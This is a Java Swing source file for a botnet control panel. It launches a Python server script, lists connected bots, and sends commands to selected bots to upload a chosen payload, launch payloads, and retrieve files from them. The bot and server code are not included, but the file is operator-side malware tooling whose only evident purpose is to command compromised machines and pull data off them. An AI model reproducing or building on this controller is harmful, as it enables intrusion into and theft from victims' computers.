/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package botnetGUI;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.DefaultListModel;
import javax.swing.JFileChooser;
import javax.swing.Timer;

/**
 *
 * @author Douglas
 */
public class BotnetGUI extends javax.swing.JFrame {
    
    private List<String> selectedValuesList;
    private Timer timer;
    private final int DELAY = 10 * 1000;    //miliseconds
    private final int PORT = 1776;
    private Lock socketLock;                //guards access to socket
    private ProcessBuilder pb;
    private Process p;
    private ServerSocket serverSocket;
    private PrintWriter out;
    private BufferedReader in;
    private Socket clientSocket;
    private static String COMMAND;// = "C:\\Python27\\python";  //absolute path to python
    private static String PYTHONSCRIPT;// = "C:\\Users\\Douglas\\Desktop\\pysocket.py";
    private final static String GETBOTSTATUS = "$GS$";
    private final static String UPLOADPAYLOADS = "$UP$";
    private final static String LAUNCHPAYLOADS = "$LP$";
    private final static String RETRIEVEFILES = "$RF$";
    private final static String FIELD_DELIMITER = "$";
    private final static char BOT_FIELD_DELIMITER = ':';
    private final int TIMEOUT = 15 * 1000;
    private DefaultListModel listModel;

    /**
     * Creates new form BotnetGUI
     */
    public BotnetGUI() {
        listModel = new DefaultListModel();
        initComponents();
        serverInit();
        buildProcess();
        serverAccept();
        updateList();
        startTimer();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        fileChooser = new javax.swing.JFileChooser();
        jPanel1 = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        botList = new javax.swing.JList<>();
        botListLabel = new javax.swing.JLabel();
        uploadPayloadButton = new javax.swing.JButton();
        retrieveFilesButton = new javax.swing.JButton();
        launchPayloadButton = new javax.swing.JButton();
        jMenuBar1 = new javax.swing.JMenuBar();
        fileJMenu = new javax.swing.JMenu();
        exitMenuItem = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowClosing(java.awt.event.WindowEvent evt) {
                formWindowClosing(evt);
            }
        });

        botList.setModel(listModel);
        botList.addListSelectionListener(new javax.swing.event.ListSelectionListener() {
            public void valueChanged(javax.swing.event.ListSelectionEvent evt) {
                botListValueChanged(evt);
            }
        });
        jScrollPane2.setViewportView(botList);

        botListLabel.setText("Available Bots:");

        uploadPayloadButton.setText("Upload Payload");
        uploadPayloadButton.setEnabled(false);
        uploadPayloadButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                uploadPayloadButtonActionPerformed(evt);
            }
        });

        retrieveFilesButton.setText("Retreive Files");
        retrieveFilesButton.setEnabled(false);
        retrieveFilesButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                retrieveFilesButtonActionPerformed(evt);
            }
        });

        launchPayloadButton.setText("LaunchPayload");
        launchPayloadButton.setEnabled(false);
        launchPayloadButton.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                launchPayloadButtonActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane2)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(botListLabel)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addComponent(uploadPayloadButton)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(retrieveFilesButton)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(launchPayloadButton)))
                .addGap(0, 382, Short.MAX_VALUE))
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addComponent(botListLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 433, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(uploadPayloadButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(retrieveFilesButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(launchPayloadButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
        );

        fileJMenu.setText("File");

        exitMenuItem.setMnemonic('x');
        exitMenuItem.setText("Exit");
        exitMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitMenuItemActionPerformed(evt);
            }
        });
        fileJMenu.add(exitMenuItem);

        jMenuBar1.add(fileJMenu);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void botListValueChanged(javax.swing.event.ListSelectionEvent evt) {//GEN-FIRST:event_botListValueChanged
        // TODO add your handling code here:
        if (!evt.getValueIsAdjusting())
        {
            selectedValuesList = botList.getSelectedValuesList();
            for(int i = 0; i < selectedValuesList.size(); ++i)
            {
                String bot = selectedValuesList.get(i);
                bot = bot.replaceAll(" .*", "");
                selectedValuesList.set(i, bot);
            }
            System.out.println(selectedValuesList);
            uploadPayloadButton.setEnabled(true);
            retrieveFilesButton.setEnabled(true);
            launchPayloadButton.setEnabled(true);
        }
    }//GEN-LAST:event_botListValueChanged

    private void exitMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitMenuItemActionPerformed
        programExit();
    }//GEN-LAST:event_exitMenuItemActionPerformed

    private void uploadPayloadButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_uploadPayloadButtonActionPerformed
        // TODO add your handling code here:
        if(0 < selectedValuesList.size())
        {
            //get payload file location
            String Path;
            int returnVal = fileChooser.showOpenDialog(this);
            if (returnVal == JFileChooser.APPROVE_OPTION) {
                File file = fileChooser.getSelectedFile();
                Path = file.getAbsolutePath();
                System.out.println("Uploading: " + Path);
                if(0 != selectedValuesList.size())
                {
                    StringBuilder command = new StringBuilder(UPLOADPAYLOADS);
                    for(int i = 0; i < selectedValuesList.size(); ++i)
                    {
                        //build command string
                        String tmp = selectedValuesList.get(i);
                        String[] splited = tmp.split("\\s+");
                        if(0 != i)
                        {
                            command.append(BOT_FIELD_DELIMITER);
                        }

                        command.append(splited[0]);           
                    }//for
                    command.append(FIELD_DELIMITER);
                    command.append(Path);
                    socketLock.lock();
                        try
                        {
                            System.out.println("Sending: " + command);
                            out.println(command);   
                        }
                        catch(Exception exc)
                        {
                            System.err.println(exc);
                        }
                        finally
                        {
                            socketLock.unlock();
                        }
                }//if select values list
            } else {
                System.out.println("File access cancelled by user.");
            }    
        }
    }//GEN-LAST:event_uploadPayloadButtonActionPerformed

    private void launchPayloadButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_launchPayloadButtonActionPerformed

        if(0 != selectedValuesList.size())
        {
            StringBuilder command = new StringBuilder(LAUNCHPAYLOADS);
            for(int i = 0; i < selectedValuesList.size(); ++i)
            {
                //build command string
                String tmp = selectedValuesList.get(i);
                String[] splited = tmp.split("\\s+");
                if(0 != i)
                {
                    command.append(BOT_FIELD_DELIMITER);
                }
                
                command.append(splited[0]);           
            }//for
            
            socketLock.lock();
                try
                {
                    System.out.println("Sending: " + command);
                    out.println(command);   
                }
                catch(Exception exc)
                {
                    System.err.println(exc);
                }
                finally
                {
                    socketLock.unlock();
                }
        }//if
    }//GEN-LAST:event_launchPayloadButtonActionPerformed

    private void retrieveFilesButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_retrieveFilesButtonActionPerformed
        if(0 != selectedValuesList.size())
        {
            fileChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
            boolean filters = fileChooser.isAcceptAllFileFilterUsed();
            fileChooser.setAcceptAllFileFilterUsed(false);
            //get payload file location
            String Path;
            int returnVal = fileChooser.showSaveDialog(this);
            if (returnVal == JFileChooser.APPROVE_OPTION) {
                File file = fileChooser.getSelectedFile();
                Path = file.getAbsolutePath();
                System.out.println("Saving: " + Path);
                
                StringBuilder command = new StringBuilder(RETRIEVEFILES);
                for(int i = 0; i < selectedValuesList.size(); ++i)
                {
                    //build command string
                    String tmp = selectedValuesList.get(i);
                    String[] splited = tmp.split("\\s+");
                    if(0 != i)
                    {
                        command.append(BOT_FIELD_DELIMITER);
                    }

                    command.append(splited[0]);           
                }//for
                command.append(FIELD_DELIMITER + Path);
                socketLock.lock();
                try
                {
                    System.out.println("Sending: " + command);
                    out.println(command);   
                }
                catch(Exception exc)
                {
                    System.err.println(exc);
                }
                finally
                {
                    socketLock.unlock();
                }    
            }//if file access
            else {
                System.out.println("File access cancelled by user.");
            }
             //restore default value
            fileChooser.setAcceptAllFileFilterUsed(false);
            fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        }//if select values list
    }//GEN-LAST:event_retrieveFilesButtonActionPerformed

    private void formWindowClosing(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowClosing
        programExit();
    }//GEN-LAST:event_formWindowClosing
    
    private void serverInit()
    {
        //set up lock to controll access
        socketLock = new ReentrantLock();
        try
        {
            //maybe work better? Should be local connection only
            //https://stackoverflow.com/questions/1542424/how-to-determine-an-incoming-connection-is-from-local-machine/1544062#1544062
            SocketAddress socketAddress = new InetSocketAddress( InetAddress.getByName( null ), PORT);
            serverSocket = new ServerSocket();
            serverSocket.bind(socketAddress);
            
            //original
            //serverSocket = new ServerSocket(PORT);
            
        }
        catch (IOException e) {
            System.out.println("Exception caught when trying to listen on port "
                + PORT + " or listening for a connection");
            System.out.println(e.getMessage());
        }
    }
    
    private void serverAccept()
    {
        try
        {
            System.out.println("Wait to accept()");
            serverSocket.setSoTimeout(TIMEOUT);
            clientSocket = serverSocket.accept();
            System.out.println("accepted");
            out = new PrintWriter(clientSocket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        }
        catch (SocketTimeoutException ste)
        {
            System.err.println(ste.getMessage());
            programExit();
        }
        catch (IOException e) {
            System.err.println("Exception caught when trying to listen on port "
                + PORT + " or listening for a connection");
            System.err.println(e.getMessage());
        }
        
        
        try {
            //test connection
            System.out.println("Attempting to receive from server");
            System.out.println(in.readLine());
        } catch (IOException ex) {
            Logger.getLogger(BotnetGUI.class.getName()).log(Level.SEVERE, null, ex);
        }
        /*//test send and respond
        System.out.println("Attempting to send to server");
        out.println("Please work");
        try{
            System.out.println(in.readLine());
        }
        catch (IOException ex){
            Logger.getLogger(BotnetGUI.class.getName()).log(Level.SEVERE, null, ex);
            System.err.println("Connection closed");
        }
        */
        
    }
    
    private void buildProcess()
    {
        System.out.println("Initializing");
        
        //start the python serverprocess
        try
        {
            pb = new ProcessBuilder(COMMAND, PYTHONSCRIPT);
            pb.redirectErrorStream(true);   //redirects process stderr to stout
            p = pb.start();
            //readProc = new BufferedReader(new InputStreamReader(p.getInputStream()));
            System.out.println("Process Execed");
        }
        catch(Exception e)
        {
            System.err.println("failed to exec server");
            System.err.println(e);
            System.exit(1);
        }
        finally
        {
            //pipeLock.unlock();
        }
        
        /*
        This process reads data from the execed server's pipe.
        Doing so prevents blocking by clearing the buffer of any
            messages the server writes to its stdout or stderr.
        Even when the pipe is unused, regularly flushing the buffer
        is a secure java best practice. See: https://www.securecoding.cert.org/
        confluence/display/java/FIO07-J.+Do+not+let+external+processes+block
        +on+IO+buffers
        */
        Thread outputGarbler = new Thread(new StreamGobbler(p.getInputStream(), System.out));
    }
    
    private void updateList()
    {
        socketLock.lock();
        try
        {
            System.out.println("Writing " + GETBOTSTATUS + " to socket");
            out.println(GETBOTSTATUS);  
            try
            {
                System.out.println("Attempting to receieve reply");
                String currentLine = in.readLine();
                /*
                need escape characters because .split(REGEX)
                */
                String[] Bots = currentLine.split("\\" + FIELD_DELIMITER);
                System.out.println("Bots size: " + Bots.length);
                listModel = new DefaultListModel<String>();
                listModel.clear();
                for(String s: Bots)
                {
                    listModel.addElement(s);
                }
                botList.setModel(listModel);
                Bots = null;
            }
            catch(Exception e)
            {
                System.err.println(e);
                System.err.println("Failed to read from process");
            }
        }
        catch(Exception e)
        {
            System.err.println(e);
        }
        finally
        {
            socketLock.unlock();
        }
           
    }//end updateList()
    
    private void startTimer()
    {
        timer = new Timer(DELAY, new ActionListener()
        {
           @Override
                public void actionPerformed(ActionEvent e)
                {
                    System.out.println("Updating List Event");
                    updateList();
                } 
        });
        timer.start();
    }
    
    private void programExit()
    {
        try {
            serverSocket.close();
        } catch (IOException ex) {
            Logger.getLogger(BotnetGUI.class.getName()).log(Level.SEVERE, null, ex);
        } catch (Exception e)
        {
            Logger.getLogger(BotnetGUI.class.getName()).log(Level.SEVERE, null, e);
        }
        try
        {
            p.destroy();
        }
        catch(Exception e)
        {
            
        }
        System.exit(0);
    }
    
    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        if(2 != args.length)
        {
            System.out.println("<path to python, path to server script");
        }
        COMMAND = args[0];
        PYTHONSCRIPT = args[1];
        
        
        System.out.println("Running project");
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(BotnetGUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(BotnetGUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(BotnetGUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(BotnetGUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        
        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new BotnetGUI().setVisible(true);
            }
        });
    }
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JList<String> botList;
    private javax.swing.JLabel botListLabel;
    private javax.swing.JMenuItem exitMenuItem;
    private javax.swing.JFileChooser fileChooser;
    private javax.swing.JMenu fileJMenu;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JButton launchPayloadButton;
    private javax.swing.JButton retrieveFilesButton;
    private javax.swing.JButton uploadPayloadButton;
    // End of variables declaration//GEN-END:variables
}//end class BotNetGui


/*this class was written using the following reference: 
https://www.securecoding.cert.org/confluence/display/java/FIO07-J.+Do+not+let+
    external+processes+block+on+IO+buffers
*/
class StreamGobbler implements Runnable {
  private final InputStream is;
  private final PrintStream os;
 
  StreamGobbler(InputStream is, PrintStream os) {
    this.is = is;
    this.os = os;
  }
 
  public void run() {
    try {
      int c;
      while ((c = is.read()) != -1)
          os.print((char) c);
    } catch (IOException x) {
      // Handle error
    }
  }
}